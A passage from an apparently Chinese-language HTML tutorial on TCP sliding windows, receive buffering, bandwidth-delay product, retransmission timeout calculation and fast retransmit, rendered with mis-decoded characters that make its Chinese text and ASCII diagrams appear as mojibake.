â”‚<br>â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”˜<br>       â””â”€â”€â”€â”€â”€â”€â”€â”€çª—å£â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>       å¯å‘é€ï¼š1,2,3,4,5,6<br><br>æ­¥éª¤1ï¼šå‘é€1,2,3<br>â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”<br>â”‚ 1* â”‚ 2* â”‚ 3* â”‚<span class="hljs-number"> 4 </span> â”‚<span class="hljs-number"> 5 </span> â”‚<span class="hljs-number"> 6 </span> â”‚<span class="hljs-number"> 7 </span> â”‚<span class="hljs-number"> 8 </span> â”‚<span class="hljs-number"> 9 </span> â”‚<br>â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”˜<br>       â””â”€â”€â”€â”€â”€â”€â”€â”€çª—å£â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>       *=å·²å‘é€<br><br>æ­¥éª¤2ï¼šæ”¶åˆ°ACK for 1,2<br>â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”<br>â”‚ 1âœ“ â”‚ 2âœ“ â”‚ 3* â”‚<span class="hljs-number"> 4 </span> â”‚<span class="hljs-number"> 5 </span> â”‚<span class="hljs-number"> 6 </span> â”‚<span class="hljs-number"> 7 </span> â”‚<span class="hljs-number"> 8 </span> â”‚<span class="hljs-number"> 9 </span> â”‚<br>â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”˜<br>             â””â”€â”€â”€â”€â”€â”€â”€â”€çª—å£â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>             çª—å£å‘å³æ»‘åŠ¨2æ ¼<br><br>æ­¥éª¤3ï¼šå¯ä»¥å‘é€7,8<br>â”Œâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”<br>â”‚ 1âœ“ â”‚ 2âœ“ â”‚ 3* â”‚<span class="hljs-number"> 4 </span> â”‚<span class="hljs-number"> 5 </span> â”‚<span class="hljs-number"> 6 </span> â”‚<span class="hljs-number"> 7 </span> â”‚<span class="hljs-number"> 8 </span> â”‚<span class="hljs-number"> 9 </span> â”‚<br>â””â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”´â”€â”€â”€â”€â”˜<br>             â””â”€â”€â”€â”€â”€â”€â”€â”€çª—å£â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>             å‘é€7,8<br></code></pre></td></tr></table></figure><h3 id="3-3-æ¥æ”¶çª—å£"><a href="#3-3-æ¥æ”¶çª—å£" class="headerlink" title="3.3 æ¥æ”¶çª—å£"></a>3.3 æ¥æ”¶çª—å£</h3><p><strong>æ¥æ”¶çª—å£ç»“æ„</strong>ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs armasm">å­—èŠ‚æµï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   å·²æ¥æ”¶    â”‚    å¯ä»¥æ¥æ”¶      â”‚      ä¸èƒ½æ¥æ”¶      â”‚<br>â”‚   å·²ç¡®è®¤    â”‚   (çª—å£å†…)       â”‚     (çª—å£å¤–)       â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>       â†‘             â†‘                  â†‘<br>      <span class="hljs-built_in">Q1</span>            <span class="hljs-built_in">Q2</span>                 <span class="hljs-built_in">Q3</span><br><br><span class="hljs-symbol">Q1:</span> å·²æ¥æ”¶å¹¶å·²ç¡®è®¤çš„æœ€åä¸€ä¸ªå­—èŠ‚<br><span class="hljs-symbol">Q2:</span> æœŸæœ›æ¥æ”¶çš„æœ€åä¸€ä¸ªå­—èŠ‚<br><span class="hljs-symbol">Q3:</span> ä¸èƒ½æ¥æ”¶çš„ç¬¬ä¸€ä¸ªå­—èŠ‚<br><br>æ¥æ”¶çª—å£ = <span class="hljs-built_in">Q3</span> - <span class="hljs-built_in">Q1</span><br></code></pre></td></tr></table></figure><p><strong>ä¹±åºåˆ°è¾¾çš„å¤„ç†</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros">æœŸæœ›æ¥æ”¶é¡ºåºï¼š1, 2, 3, 4, 5<br><br>å®é™…åˆ°è¾¾é¡ºåºï¼š1, 3, 2, 5, 4<br><br>å¤„ç†ï¼š<br>1. æ”¶åˆ°1 â†’ äº¤ä»˜åº”ç”¨å±‚ï¼Œ<span class="hljs-attribute">ACK</span>=2<br>2. æ”¶åˆ°3 â†’ ç¼“å­˜ï¼ˆç­‰å¾…2ï¼‰ï¼Œ<span class="hljs-attribute">ACK</span>=2<br>3. æ”¶åˆ°2 â†’ äº¤ä»˜1,2,3ï¼Œ<span class="hljs-attribute">ACK</span>=4<br>4. æ”¶åˆ°5 â†’ ç¼“å­˜ï¼ˆç­‰å¾…4ï¼‰ï¼Œ<span class="hljs-attribute">ACK</span>=4<br>5. æ”¶åˆ°4 â†’ äº¤ä»˜4,5ï¼Œ<span class="hljs-attribute">ACK</span>=6<br><br>ç­–ç•¥ï¼š<br>- æŒ‰åºäº¤ä»˜ç»™åº”ç”¨å±‚<br>- ä¹±åºæ•°æ®æš‚å­˜åœ¨ç¼“å†²åŒº<br>- ç´¯ç§¯ç¡®è®¤<br></code></pre></td></tr></table></figure><h3 id="3-4-çª—å£å¤§å°çš„å½±å“"><a href="#3-4-çª—å£å¤§å°çš„å½±å“" class="headerlink" title="3.4 çª—å£å¤§å°çš„å½±å“"></a>3.4 çª—å£å¤§å°çš„å½±å“</h3><p><strong>å¸¦å®½å»¶è¿Ÿç§¯ï¼ˆBDPï¼‰</strong>ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">BDP</span> <span class="hljs-operator">=</span> å¸¦å®½ Ã— RTT<br><br>ç¤ºä¾‹ï¼š<br>å¸¦å®½ <span class="hljs-operator">=</span> <span class="hljs-number">100</span> Mbps <span class="hljs-operator">=</span> <span class="hljs-number">12.5</span> MB/s<br><span class="hljs-attribute">RTT</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span> ms <span class="hljs-operator">=</span> <span class="hljs-number">0.1</span> s<br><br><span class="hljs-attribute">BDP</span> <span class="hljs-operator">=</span> <span class="hljs-number">12.5</span> MB/s Ã— <span class="hljs-number">0.1</span>s <span class="hljs-operator">=</span> <span class="hljs-number">1.25</span> MB<br><br>å«ä¹‰ï¼š<br>- åœ¨æ”¶åˆ°ACKå‰ï¼Œå¯ä»¥å‘é€<span class="hljs-number">1.25</span>MBæ•°æ®<br>- çª—å£å¤§å°åº”è¯¥ â‰¥ BDP<br>- å¦åˆ™æ— æ³•å……åˆ†åˆ©ç”¨å¸¦å®½<br></code></pre></td></tr></table></figure><p><strong>çª—å£å¤§å°é™åˆ¶</strong>ï¼š</p><figure class="highlight rib"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs rib">TCPå¤´éƒ¨çª—å£å­—æ®µï¼š<span class="hljs-number">16</span>ä½<br>æœ€å¤§çª—å£å¤§å°ï¼š<span class="hljs-number">2</span>^<span class="hljs-number">16</span> = <span class="hljs-number">65536</span> å­—èŠ‚ = <span class="hljs-number">64</span> KB<br><br>é—®é¢˜ï¼š<br>é«˜é€Ÿé•¿å»¶è¿Ÿç½‘ç»œï¼ˆå¦‚å«æ˜Ÿé“¾è·¯ï¼‰éœ€è¦æ›´å¤§çª—å£<br><br>è§£å†³ï¼š<br>çª—å£æ‰©å¤§é€‰é¡¹ (Window <span class="hljs-keyword">Scale</span> <span class="hljs-keyword">Option</span>)<br>å®é™…çª—å£ = çª—å£å­—æ®µå€¼ Ã— <span class="hljs-number">2</span>^<span class="hljs-keyword">Scale</span><br>æœ€å¤§<span class="hljs-keyword">Scale</span> = <span class="hljs-number">14</span><br>æœ€å¤§çª—å£ = <span class="hljs-number">65536</span> Ã— <span class="hljs-number">2</span>^<span class="hljs-number">14</span> = <span class="hljs-number">1</span> GB<br></code></pre></td></tr></table></figure><hr><h2 id="4-è¶…æ—¶é‡ä¼ æœºåˆ¶"><a href="#4-è¶…æ—¶é‡ä¼ æœºåˆ¶" class="headerlink" title="4. è¶…æ—¶é‡ä¼ æœºåˆ¶"></a>4. è¶…æ—¶é‡ä¼ æœºåˆ¶</h2><h3 id="4-1-è¶…æ—¶é‡ä¼ åŸç†"><a href="#4-1-è¶…æ—¶é‡ä¼ åŸç†" class="headerlink" title="4.1 è¶…æ—¶é‡ä¼ åŸç†"></a>4.1 è¶…æ—¶é‡ä¼ åŸç†</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å‘é€æ–¹è¡Œä¸ºï¼š<br><span class="hljs-bullet">1.</span> å‘é€æ•°æ®æ®µ<br><span class="hljs-bullet">2.</span> å¯åŠ¨é‡ä¼ è®¡æ—¶å™¨<br><span class="hljs-bullet">3.</span> å¦‚æœè¶…æ—¶ä»æœªæ”¶åˆ°ACK<br>   â””â”€ é‡ä¼ è¯¥æ•°æ®æ®µ<br><span class="hljs-bullet">4.</span> æ”¶åˆ°ACK<br>   â””â”€ å–æ¶ˆè®¡æ—¶å™¨<br></code></pre></td></tr></table></figure><p><strong>è¶…æ—¶é‡ä¼ ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">å‘é€æ–¹                                     æ¥æ”¶æ–¹<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1000, Len=100                       </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string"> [å¯åŠ¨è®¡æ—¶å™¨]                              </span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                                       âŒ æ•°æ®ä¸¢å¤±</span><br><span class="hljs-string">  </span>|<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> [è¶…æ—¶ï¼]                                 </span>|<br>  |<span class="hljs-string"> SEQ=1000, Len=100 (é‡ä¼ )                </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                  ACK=1100                </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string"> âœ… æ”¶åˆ°ACKï¼Œå–æ¶ˆè®¡æ—¶å™¨                    </span>|<br></code></pre></td></tr></table></figure><h3 id="4-2-é‡ä¼ è¶…æ—¶æ—¶é—´ï¼ˆRTOï¼‰çš„è®¡ç®—"><a href="#4-2-é‡ä¼ è¶…æ—¶æ—¶é—´ï¼ˆRTOï¼‰çš„è®¡ç®—" class="headerlink" title="4.2 é‡ä¼ è¶…æ—¶æ—¶é—´ï¼ˆRTOï¼‰çš„è®¡ç®—"></a>4.2 é‡ä¼ è¶…æ—¶æ—¶é—´ï¼ˆRTOï¼‰çš„è®¡ç®—</h3><p><strong>é—®é¢˜ï¼šRTOè®¾ç½®å¤šå°‘åˆé€‚ï¼Ÿ</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RTOå¤ªå°ï¼š<br><span class="hljs-bullet">- </span>ä¸å¿…è¦çš„é‡ä¼ <br><span class="hljs-bullet">- </span>æµªè´¹å¸¦å®½<br><span class="hljs-bullet">- </span>åŠ é‡ç½‘ç»œè´Ÿæ‹…<br><br>RTOå¤ªå¤§ï¼š<br><span class="hljs-bullet">- </span>é‡ä¼ å»¶è¿Ÿå¤§<br><span class="hljs-bullet">- </span>å½±å“æ€§èƒ½<br><span class="hljs-bullet">- </span>ç”¨æˆ·ä½“éªŒå·®<br><br>ç†æƒ³ï¼šRTO ç•¥å¤§äº RTT<br></code></pre></td></tr></table></figure><p><strong>RTOè®¡ç®—ç®—æ³•ï¼ˆJacobsonç®—æ³•ï¼‰</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1. æµ‹é‡RTTæ ·æœ¬ï¼ˆæ¯æ¬¡æ”¶åˆ°ACKæ—¶ï¼‰<br>   RTT_sample = ACKåˆ°è¾¾æ—¶é—´ - å‘é€æ—¶é—´<br><br>2. è®¡ç®—å¹³æ»‘RTTï¼ˆSRTTï¼‰<br>   SRTT = (1 - Î±) Ã— SRTT + Î± Ã— RTT_sample<br>   Î± = 0.125 (1/8)<br><br>3. è®¡ç®—RTTå˜åŒ–ï¼ˆRTTVARï¼‰<br>   RTTVAR = (1 - Î²) Ã— RTTVAR + Î² Ã— |SRTT - RTT_sample|<br>   Î² = 0.25 (1/4)<br><br>4. è®¡ç®—RTO<br>   RTO = SRTT + 4 Ã— RTTVAR<br>   æœ€å°å€¼ï¼š200msï¼ˆLinuxé»˜è®¤ï¼‰<br>   æœ€å¤§å€¼ï¼š120ç§’<br><br>ç¤ºä¾‹ï¼š<br>å‡è®¾ï¼š<br>RTTæ ·æœ¬åºåˆ—ï¼š100ms, 110ms, 90ms, 105ms<br><br>åˆå§‹ï¼š<span class="hljs-attribute">SRTT</span>=100ms, <span class="hljs-attribute">RTTVAR</span>=0<br><br>ç¬¬1æ¬¡ï¼š<span class="hljs-attribute">RTT</span>=110ms<br>SRTT = 0.875Ã—100 + 0.125Ã—110 = 101.25ms<br>RTTVAR = 0.75Ã—0 + 0.25Ã—|100-110| = 2.5ms<br>RTO = 101.25 + 4Ã—2.5 = 111.25ms<br><br>ç¬¬2æ¬¡ï¼š<span class="hljs-attribute">RTT</span>=90ms<br>SRTT = 0.875Ã—101.25 + 0.125Ã—90 = 99.84ms<br>RTTVAR = 0.75Ã—2.5 + 0.25Ã—|101.25-90| = 4.69ms<br>RTO = 99.84 + 4Ã—4.69 = 118.6ms<br></code></pre></td></tr></table></figure><h3 id="4-3-é‡ä¼ æ­§ä¹‰é—®é¢˜"><a href="#4-3-é‡ä¼ æ­§ä¹‰é—®é¢˜" class="headerlink" title="4.3 é‡ä¼ æ­§ä¹‰é—®é¢˜"></a>4.3 é‡ä¼ æ­§ä¹‰é—®é¢˜</h3><p><strong>é—®é¢˜ï¼šé‡ä¼ åæ”¶åˆ°ACKï¼Œè¿™ä¸ªACKæ˜¯å¯¹åŸå§‹æ®µè¿˜æ˜¯é‡ä¼ æ®µçš„ç¡®è®¤ï¼Ÿ</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">åœºæ™¯1ï¼šACKæ˜¯å¯¹åŸå§‹æ®µçš„ç¡®è®¤<br>å‘é€æ–¹                                     æ¥æ”¶æ–¹<br>  |<span class="hljs-string"> SEQ=1000                                </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string"> [å¯åŠ¨è®¡æ—¶å™¨]                              </span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                         ACK=1100 (å»¶è¿Ÿ)  </span>|<br>  |<span class="hljs-string"> [è¶…æ—¶ï¼é‡ä¼ ]                 â†“            </span>|<br>  |<span class="hljs-string"> SEQ=1000 (é‡ä¼ )           â†“              </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;            â†“              </span>|<br>  |<span class="hljs-string">                           â†“              </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              </span>|<br>  |<span class="hljs-string"> æ”¶åˆ°ACK                                  </span>|<br><br>  RTTè®¡ç®—ï¼šå¦‚æœç”¨é‡ä¼ æ—¶é—´ï¼Œä¼šé«˜ä¼°RTT âŒ<br><br>åœºæ™¯2ï¼šACKæ˜¯å¯¹é‡ä¼ æ®µçš„ç¡®è®¤<br>å‘é€æ–¹                                     æ¥æ”¶æ–¹<br>  |<span class="hljs-string"> SEQ=1000                                </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt; âŒ ä¸¢å¤±                    </span>|<br>  |<span class="hljs-string"> [å¯åŠ¨è®¡æ—¶å™¨]                              </span>|<br>  |<span class="hljs-string"> [è¶…æ—¶ï¼é‡ä¼ ]                              </span>|<br>  |<span class="hljs-string"> SEQ=1000 (é‡ä¼ )                         </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string">                  ACK=1100                </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br><br>  RTTè®¡ç®—ï¼šå¦‚æœç”¨åŸå§‹å‘é€æ—¶é—´ï¼Œä¼šé«˜ä¼°RTT âŒ<br></code></pre></td></tr></table></figure><p><strong>Karnç®—æ³•è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">è§„åˆ™ï¼š<br><span class="hljs-bullet">1.</span> é‡ä¼ çš„æ®µä¸ç”¨äºRTTè®¡ç®—<br><span class="hljs-bullet">2.</span> åªç”¨æˆåŠŸä¼ è¾“ï¼ˆæœªé‡ä¼ ï¼‰çš„æ®µè®¡ç®—RTT<br><br>ç¼ºç‚¹ï¼š<br>å¦‚æœè¿ç»­ä¸¢åŒ…ï¼Œæ— æ³•æ›´æ–°RTO<br><br>è§£å†³ï¼š<br>ç»“åˆæŒ‡æ•°é€€é¿ï¼ˆExponential Backoffï¼‰<br>æ¯æ¬¡é‡ä¼ ï¼ŒRTOç¿»å€<br>RTO<span class="hljs-emphasis">_new = RTO_</span>old Ã— 2<br></code></pre></td></tr></table></figure><hr><h2 id="5-å¿«é€Ÿé‡ä¼ ä¸å¿«é€Ÿæ¢å¤"><a href="#5-å¿«é€Ÿé‡ä¼ ä¸å¿«é€Ÿæ¢å¤" class="headerlink" title="5. å¿«é€Ÿé‡ä¼ ä¸å¿«é€Ÿæ¢å¤"></a>5. å¿«é€Ÿé‡ä¼ ä¸å¿«é€Ÿæ¢å¤</h2><h3 id="5-1-å¿«é€Ÿé‡ä¼ ï¼ˆFast-Retransmitï¼‰"><a href="#5-1-å¿«é€Ÿé‡ä¼ ï¼ˆFast-Retransmitï¼‰" class="headerlink" title="5.1 å¿«é€Ÿé‡ä¼ ï¼ˆFast Retransmitï¼‰"></a>5.1 å¿«é€Ÿé‡ä¼ ï¼ˆFast Retransmitï¼‰</h3><p><strong>é—®é¢˜ï¼šè¶…æ—¶é‡ä¼ å¤ªæ…¢</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ä¼ ç»Ÿè¶…æ—¶é‡ä¼ ï¼š<br><span class="hljs-bullet">- </span>ç­‰å¾…RTOè¶…æ—¶ï¼ˆå¯èƒ½å‡ ç™¾æ¯«ç§’ï¼‰<br><span class="hljs-bullet">- </span>å½±å“ä¼ è¾“æ•ˆç‡<br></code></pre></td></tr></table></figure><p><strong>å¿«é€Ÿé‡ä¼ åŸç†</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">è§„åˆ™ï¼š<br>æ”¶åˆ°3ä¸ªé‡å¤ACKï¼Œç«‹å³é‡ä¼ ï¼Œä¸ç­‰è¶…æ—¶<br><br>ä¸ºä»€ä¹ˆæ˜¯3ä¸ªï¼Ÿ<br><span class="hljs-bullet">- </span>1ä¸ªé‡å¤ACKï¼šå¯èƒ½æ˜¯ä¹±åºåˆ°è¾¾<br><span class="hljs-bullet">- </span>2ä¸ªé‡å¤ACKï¼šå¯èƒ½è¿˜æ˜¯ä¹±åº<br><span class="hljs-bullet">- </span>3ä¸ªé‡å¤ACKï¼šå¾ˆå¯èƒ½æ˜¯ä¸¢åŒ…<br></code></pre></td></tr></table></figure><p><strong>å¿«é€Ÿé‡ä¼ ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">å‘é€æ–¹                                     æ¥æ”¶æ–¹<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1000, Len=100                       </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1100                </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1100, Len=100                       </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;  âŒ ä¸¢å¤±                       </span>|<br>  |<span class="hljs-string">                                          </span>|<br>  |<span class="hljs-string"> SEQ=1200, Len=100                       </span>|<br>  |<span class="hljs-string">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span>|<br>  |<span class="hljs-string">                  ACK=1100 (é‡å¤1)        </span>|<br>  |<span class="hljs-string">&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span>|<br>  |<span 